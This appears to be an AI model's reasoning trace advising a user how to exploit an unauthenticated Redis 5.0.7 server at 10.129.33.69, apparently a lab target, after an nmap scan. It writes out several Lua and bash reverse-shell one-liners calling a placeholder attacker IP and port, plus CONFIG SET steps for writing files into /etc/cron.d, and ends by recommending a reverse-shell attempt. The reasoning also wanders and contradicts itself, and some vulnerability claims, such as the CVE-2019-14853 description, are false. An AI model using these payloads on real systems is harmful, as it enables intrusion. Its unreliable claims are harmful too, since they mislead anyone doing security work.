Let me recap what\'s been done so far. The user ran an nmap scan on 10.129.33.69 and found that port 6379 (Redis) is open. Then they connected to the Redis instance using redis-cli and ran CONFIG GET * to check the configuration.\n\nLooking at the CONFIG output, some key points stand out. The "appendonly" setting is set to "no", which means AOF (Append Only File) logging isn\'t enabled. That\'s important because if Redis isn\'t configured with proper authentication or security settings, there might be a way to exploit it. The "dir" is /var/lib/redis, which is the default directory. The "bind" setting includes 0.0.0.0, meaning it\'s listening on all interfaces, which combined with no authentication could be a problem. \n\nThe "requirepass" configuration isn\'t listed here, which might mean there\'s no password set. If that\'s the case, the Redis instance is wide open. Since Redis allows for command execution through certain methods when misconfigured, like using the CONFIG SET command to write files or leveraging LUALoad vulnerabilities, this could be a path to RCE (Remote Code Execution).\n\nSince the user has access to the Redis config, maybe they can set up a configuration to write a script or a shell. Since appendonly is off, maybe they can use the CONFIG SET to change the dir or other settings to upload a file. Alternatively, if Redis is running as root (which it shouldn\'t but sometimes happens), they might be able to exploit that to get a shell.\n\nAnother angle is checking if the Redis version (5.0.7) has known vulnerabilities. For example, in some versions, you can use the MONITOR command to get a shell or exploit the debug command. But since the user already connected, maybe they can try executing commands directly.\n\nWait, in Redis, if it\'s unauthenticated, you can try using the following steps: \n\n1. Check if you can write to the directory. Since the dir is /var/lib/redis, maybe you can use CONFIG SET dir /path/to/somewhere to change the working directory to a writable place, then use CONFIG SET dbfilename to set the dump file to a script, then save, which would create the file. Then, if you can execute that script, you might get a shell.\n\nAlternatively, if Lua is enabled (which it usually is), you could use the EVAL command to execute a Lua script that writes a file. Since the user\'s Redis is on version 5.0.7, which might be vulnerable to certain Lua exploits. \n\nLooking at the config, "maxmemory-policy" is "noeviction", which isn\'t directly a problem. "appendfsync" is everysec, so data is synced every second. But the critical thing is that there\'s no password (since requirepass isn\'t set), so we have full access.\n\nThe next step would be to try to gain code execution. So, the user should try to write a malicious Lua script or a shell script into the Redis directory and then execute it. Let me think of the exact commands.\n\nFirst, check if the Redis instance allows writing to the directory. Since the current directory is /var/lib/redis, perhaps the user can use the CONFIG SET command to change the directory to a web root or somewhere executable. Alternatively, if they can write a .lua script that uses io.popen to execute commands.\n\nWait, Redis\'s EVAL command can execute Lua scripts. So, even without needing to write to disk, if the Lua environment allows system commands, that\'s a way in. But by default, Lua in Redis restricts certain functions. However, sometimes there are workarounds. For example, using cmsgpack to execute code, but in Redis 5.0.7, maybe that\'s possible.\n\nAlternatively, using the debug command. In Redis, the DEBUG RELOAD command reloads the configuration, which might help in changing directories. \n\nSo, possible steps:\n\n1. Check if you can execute a Lua script that spawns a shell. For example:\n\nEVAL "os.execute(\'/bin/bash -c \\"echo \' + \'id\' + \' > /tmp/test\'\\"")" 0\n\nBut Lua\'s os.execute might not be available if Redis restricts it. Alternatively, using require(\'os\') but that might not be allowed.\n\nAlternatively, write a file using the CONFIG SET and then execute it. For example:\n\nCONFIG SET dir /var/tmp\n\nCONFIG SET dbfilename "exploit.sh"\n\nSAVE\n\nThis would create a file /var/tmp/exploit.sh with the Redis data, but how to make that a shell script? Maybe the content can be crafted to be executable. Alternatively, write a PHP file if there\'s a web server.\n\nAlternatively, if Redis is running as root, maybe use the MONITOR command to get a shell. Wait, MONITOR outputs all commands, but how does that help?\n\nAlternatively, if the server has a writable directory where a reverse shell can be placed, then execute it. Since the user has access to Redis commands, perhaps they can use the following steps:\n\nUse the CONFIG SET to set the dir to /tmp, then set the dbfilename to a shell script, then do SAVE to create the file. Then, if the user can execute that script via some means (maybe the web server if /tmp is served), but that depends on the server setup.\n\nAlternatively, use the following Lua script to execute a command:\n\nEVAL "local io = require(\'io\'); local f = io.popen(\'bash -c \\"echo >/dev/tcp/attacker_ip/attacker_port\\"\', \'r\') f:read(\'*a\') f:close()" 0\n\nThis would try to open a connection to the attacker\'s machine, but it requires that the Lua environment allows \'io.popen\' which might be restricted. However, in some cases, if the Redis server is vulnerable, this can work.\n\nAlternatively, the user can check if the Redis instance allows writing to the /root or /tmp directory and then create a script there and execute it via some method.\n\nAlternatively, if the Redis is configured to allow command execution through the debug command, like:\n\nDEBUG SEGFAULT\n\nBut that would crash the server, not helpful for getting a shell.\n\nHmm. Since the user already has the configuration output, the critical point is that the Redis is unauthenticated. Therefore, the next step is to attempt RCE via Lua. Let me look up if Redis 5.0.7 has the Lua sandbox bypass vulnerability.\n\nWait, Redis versions before 5.0.5 had a vulnerability (CVE-2019-14853) where a Lua script could call the \'load\' function to execute arbitrary code. However, Redis 5.0.7 is patched for that. Wait, let me confirm:\n\nLooking up CVE-2019-14853: It states that Redis before 5.0.5 allows RCE via malicious Lua scripts using load(). So, 5.0.5 and above have this fixed. Since the version here is 5.0.7, that fix is in place. So that method is blocked.\n\nHmm, so maybe other methods. Another way is using the fact that if the Redis is running as root, you can write a file to /etc/cron.d or something similar. Let\'s see:\n\nFirst, change the directory to /etc/cron.d with:\n\nCONFIG SET dir /etc/cron.d\n\nThen set the dbfilename to something like \'exploit\':\n\nCONFIG SET dbfilename "exploit"\n\nThen, execute the SAVE command to write the database to that file. The content of the file will be the Redis data, but maybe we can manipulate it to create a cron job.\n\nWait, but the Redis data is a dump of the current database. So unless you can fill the database with cron-formatted data, this might not work. Alternatively, maybe use multiple CONFIG SET commands to write a file that can be executed.\n\nAlternatively, if the user can write a .lua file in a directory that\'s loaded by Redis. For example, if the Redis config has a \'lua-script-loader\' or something, but that\'s not standard.\n\nAlternatively, use the fact that Redis can load external Lua scripts from disk using the SCRIPT LOAD command, but that might not help.\n\nAlternatively, maybe use the SHUTDOWN command to restart Redis, but that\'s not helpful for getting a shell.\n\nHmm, perhaps the next step is to use the MONITOR command. When you run MONITOR, it outputs all commands in real-time. If you can redirect that output to a file, but I\'m not sure.\n\nWait, here\'s another approach: If you can write to the Redis directory, you can create a .so or .dll file (depending on OS) that contains a payload, then use the Redis to load it. But that requires the server to have the appropriate libraries and Redis to be configured to load modules, which might not be the case.\n\nAlternatively, use the fact that Redis can execute system commands via the Lua \'os.execute\' if it\'s allowed. Even in later versions, if the Lua sandbox is somehow not properly enforced, but in 5.0.7, it should be.\n\nAlternatively, maybe the server has another vulnerability that can be exploited in conjunction with Redis access.\n\nAlternatively, maybe the user can access other services by using Redis as a pivot.\n\nAlternatively, the next step is to try to run a Lua script that spawns a shell using available functions.\n\nWait, here\'s a possible Lua one-liner for RCE in Redis (if possible):\n\nEVAL "local socket=require(\'socket\'); local host=\'attacker_ip\'; local port=\'attacker_port\'; local tcp=socket.tcp(); tcp:connect(host,port); while true do local cmd,t = tcp:receive(); local f=io.popen(cmd, \'r\'); local s=f:read(\'*a\'); tcp:send(s); f:close(); end" 0\n\nThis script, if allowed, would open a reverse shell. The problem is whether the Lua environment allows \'require(\'socket\')\', which may not be available unless the socket library is installed. But if it\'s available, then this could work. Alternatively, use other methods to create a socket.\n\nAlternatively, use the \'http\' package, but again depends on the environment.\n\nAlternatively, if the user can\'t get RCE directly, maybe they can escalate privileges through other means. But without more info on the system, it\'s hard.\n\nAlternatively, the next step is to try to get a reverse shell using the Lua script, even if it\'s against the patched version, maybe there\'s another way.\n\nAlternatively, the user can use the Redis to read sensitive files if they can, but that\'s not RCE.\n\nWait, perhaps the user can write a file to the webroot and then access it via a browser, but that requires knowledge of the web server setup.\n\nAlternatively, given that the user has full Redis access, the next logical step is to attempt RCE via Lua, even if it\'s against the patched version. Let\'s see what the user can do:\n\nIn Redis 5.0.7, the \'load\' function is restricted, but other functions like \'require\' might still be available. For example, to open a socket:\n\nEVAL "require(\'socket.core\').tcp(socket.core().connect(\'attacker_ip\', attacker_port))" 0\n\nBut I\'m not sure about the syntax here.\n\nAlternatively, perhaps the user can use the following code to create a reverse shell:\n\nEVAL "local shell = require(\'posix\').system(\'/bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\')" 0\n\nBut again, this depends on the \'posix\' library being available, which might not be the case.\n\nHmm, this is getting complicated. Maybe the user should try the Lua script that uses os.execute:\n\nEVAL "os.execute(\'bash -c \\"bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\\"\')" 0\n\nIf this works, then they get a shell. But in Redis 5.0.7, the Lua sandbox should prevent this. Wait, according to Redis documentation, the Lua sandbox restricts certain functions. For example, os.execute is allowed only if the Redis server is configured to allow it, which is not the default.\n\nWait, actually, in Redis, when you use EVAL, the Lua environment is sandboxed, and many functions like os.execute are not available unless explicitly allowed. Therefore, this approach might not work.\n\nHmm. Maybe the next best step is to read files from the server using Redis commands. For example, using the DEBUG OBJECT command, but that might not help. Or using the KEYS command to list keys, but that\'s not helpful.\n\nAlternatively, if the user can write a file to a known location and then include it in a web server\'s directory, then they can execute it via a web browser.\n\nAlternatively, the user can use Redis to store a payload in a key and then have another service read it and execute it. For example, if there\'s a cron job that runs Redis commands and executes them as shell commands, but that would be a misconfiguration.\n\nAlternatively, the user can check for other misconfigurations in Redis, such as allowing clients to connect without authentication, which they already have.\n\nHmm. Given that the user has full access to Redis, and assuming that they can\'t get RCE through the current methods, maybe the next step is to look for other vulnerabilities in the system. But without more information, it\'s hard.\n\nAlternatively, perhaps the user can exploit the fact that Redis is running as root (if it is) and use that to escalate privileges. For example, if Redis is root, then writing a file to /etc/passwd or similar would be possible, but that requires specific commands.\n\nAlternatively, maybe the user can use Redis to send commands to other services. For example, if there\'s a message queue or something that listens to Redis, then they can inject malicious messages.\n\nAlternatively, perhaps the user can use Redis as a proxy to access other services on the internal network.\n\nGiven that the question is about what the user should do next after gaining Redis access, the most straightforward and common next step is to attempt to get a shell via a Lua script. Even if it\'s against a patched version, it\'s worth trying. So the answer would involve executing a Lua script to spawn a shell.\n\nBut to be precise, in Redis 5.0.7, the Lua sandbox restricts the use of certain functions. However, there might be ways around it if the environment has certain modules loaded or if there\'s a misconfiguration.\n\nAlternatively, the user can try to use the following Lua script:\n\nEVAL "local io = require(\'io\'); local f = io.popen(\'bash -c bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\'); f:read(\'*a\')" 0\n\nThis uses the io.popen function to execute a command. If \'io.popen\' is available, this could work. However, in the Redis sandbox, \'io\' is part of the standard Lua libraries, but \'popen\' is part of the \'io\' module, which may be allowed. Wait, in the Redis sandbox, the \'io\' module is disabled by default. The Lua code executed in Redis\'s EVAL is restricted. The Redis documentation says that the following functions are available: math, string, table, etc., but not io, os, etc.\n\nAh, right. The Redis EVAL command\'s Lua environment has a restricted set of functions. The \'io\' and \'os\' libraries are not available by default. Therefore, the user can\'t use those functions. So, the standard way to get RCE in Redis is to use the \'load\' function to execute arbitrary code, but in Redis 5.0.7, the \'load\' function is disabled.\n\nWait, actually, in Redis 5.0.7, the \'load\' function is not available in the Lua environment. Therefore, the user cannot execute arbitrary code via Lua. So, perhaps the user can\'t get RCE directly through Redis.\n\nHmm. Then what\'s the next step? The user might look for other vulnerabilities. For example, if Redis is configured to listen on all interfaces, maybe they can pivot to other services. Or maybe they can read sensitive data from Redis keys.\n\nAlternatively, maybe the user can leverage Redis to execute commands by using other interfaces, like Redis modules that might have vulnerabilities.\n\nAlternatively, maybe the user can use the Redis FLUSHALL command to delete all data, but that\'s more of a denial of service.\n\nAlternatively, perhaps the user can use the Redis CONFIG command to get information about the server, like the path to the configuration file.\n\nFor example:\n\nCONFIG GET *\n\nThis would give the user information about the Redis configuration, such as the directory where the configuration file is stored, or the path to the log file.\n\nAlternatively, the user can check the Redis version with:\n\nINFO\n\nThis gives detailed information about the Redis server, including the version, which the user might already know.\n\nAlternatively, maybe the user can check the Redis modules loaded with:\n\nMODULE LIST\n\nIf any modules are loaded, perhaps they have vulnerabilities.\n\nAlternatively, if the Redis server has the Redis-JSON module or other modules that allow executing scripts or commands, that could be exploited.\n\nAlternatively, if the user can\'t get RCE through Redis itself, they might need to look for other services on the same machine that can be accessed through Redis\'s configuration or through the privileges that Redis is running with.\n\nAlternatively, maybe the user can abuse the Redis feature of being able to write to a file if the Redis server has the CONFIG SET directive allowed.\n\nFor example, if the user can set the \'dir\' configuration:\n\nCONFIG SET dir /tmp\n\nThen, using the SAVE command, Redis will create a dump.rdb in the specified directory. But this requires the user to have the ability to set the configuration, which might not be allowed by default.\n\nAlternatively, if the user can set the \'dbfilename\' to a file they can read, then they can write the database to that file and read it.\n\nBut again, this requires the CONFIG SET command to be allowed, which in many cases is restricted to require a password or when Redis is started with --protected-mode no.\n\nAlternatively, maybe the user can use the Redis to interact with other services. For example, if Redis is used as a message broker, the user can send malicious messages to other services.\n\nAlternatively, the user can look for any keys in Redis that contain sensitive information like API keys, passwords, or other credentials that can be used to access other systems.\n\nFor example:\n\nSCAN 0 MATCH "*password*"\n\nOr look for keys that might contain credentials.\n\nIf the user finds any such keys, they can extract the data and use it for further compromise.\n\nTherefore, the most probable next steps are:\n\n1. Attempt to get RCE via Lua scripts (even if it might not work on newer versions).\n\n2. Enumerate the Redis configuration and modules to look for possible vulnerabilities.\n\n3. Look for sensitive data in Redis keys.\n\n4. Exploit any discovered vulnerabilities in modules or configurations.\n\nBut since the question is about what the user should do next after accessing Redis, the most direct answer would be to try to execute a shell via a Lua script, even if it\'s against newer versions. However, given that in modern versions this is restricted, the user might instead look for sensitive data or configuration info first.\n\nAlternatively, the user might check if Redis is configured to allow command execution through other means.\n\nWait, perhaps there\'s a different approach. If the Redis server is running as root or with elevated privileges, and there\'s a writeable directory, maybe the user can create a file that can be used to gain access.\n\nAlternatively, if Redis has the MONITOR command enabled, the user can monitor all commands, but that\'s more about reconnaissance.\n\nAnother angle: if Redis is using a version that has a known vulnerability that allows RCE even without executing Lua, like in older versions where the KEYS command could be used with a path traversal to write files, but that\'s more of a historical approach.\n\nAlternatively, if the user can set the Redis configuration to allow clients to write to files, but that requires CONFIG SET which might be restricted.\n\nAlternatively, the user might try to use the Redis server to connect back to them via the following command:\n\nredis-cli -h <attacker_ip> -p <attacker_port> -x < <command_to_execute>\n\nBut this would require the Redis server to be able to connect to the attacker\'s machine, which might not be possible if there are network restrictions.\n\nAlternatively, the user might look for other services on the same machine that Redis is running on, using the information from the INFO command.\n\nAlternatively, maybe the user can use the Redis server to attack other services on the same network.\n\nGiven all this, the most common next steps would be:\n\n- Enumerate the Redis configuration and modules to look for possible vulnerabilities.\n\n- Look for sensitive data in the keys.\n\n- Attempt to get RCE via Lua scripts (even if it\'s not possible, it\'s a standard step).\n\nSince the question is about what the user should do next, the answer is likely to attempt to execute a reverse shell via a Lua script. Even though in newer versions this might not work, it\'s a standard step in exploitation.\n\nHowever, considering that in Redis 5.0.7 and above, the Lua environment restricts the use of functions that could lead to RCE, the user might need to look for other vectors. Therefore, maybe the next step is to look for other vulnerabilities or misconfigurations.\n\nAlternatively, perhaps the user can use the following Lua script to execute a command:\n\neval "os.execute(\'bash -c bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\')" 0\n\nBut as mentioned earlier, \'os\' is not available in the restricted environment.\n\nAlternatively, using the \'load\' function which is also restricted.\n\nAlternatively, the user might find that the Redis server is running as root and can be used to escalate privileges through other means.\n\nAlternatively, the user can look for Redis modules that have vulnerabilities. For example, if the RedisJSON module is installed, maybe there\'s a way to execute code.\n\nAlternatively, if the Redis server has the \'debug\' command allowed, the user can use:\n\nDEBUG SEGFAULT\n\nWhich will crash the server, but that\'s a denial of service.\n\nAlternatively, the user can look for the Redis path and see if they can write a startup script.\n\nAlternatively, the user can try to use the Redis server to read files by exploiting path traversal in the CONFIG GET command, but that requires specific configurations.\n\nAlternatively, the user can use the following to get the Redis configuration:\n\nCONFIG GET *\n\nThis might reveal the path to the configuration file, which could be read if Redis has access to it.\n\nFor example:\n\nCONFIG GET dir\n\nCONFIG GET dbfilename\n\nThen, using the DUMP command to get the contents of a key, but that requires the key to exist.\n\nAlternatively, the user can look for existing keys that might contain sensitive information.\n\nTherefore, the most practical next steps are:\n\n1. Enumerate Redis configuration and modules.\n\n2. Look for sensitive data in keys.\n\n3. Attempt RCE via any possible means, even if it\'s not the standard Lua approach.\n\nGiven all this, the best answer is to attempt to execute a shell using a Lua script, even if it might not work, and then proceed to look for sensitive data or configuration vulnerabilities.\n',
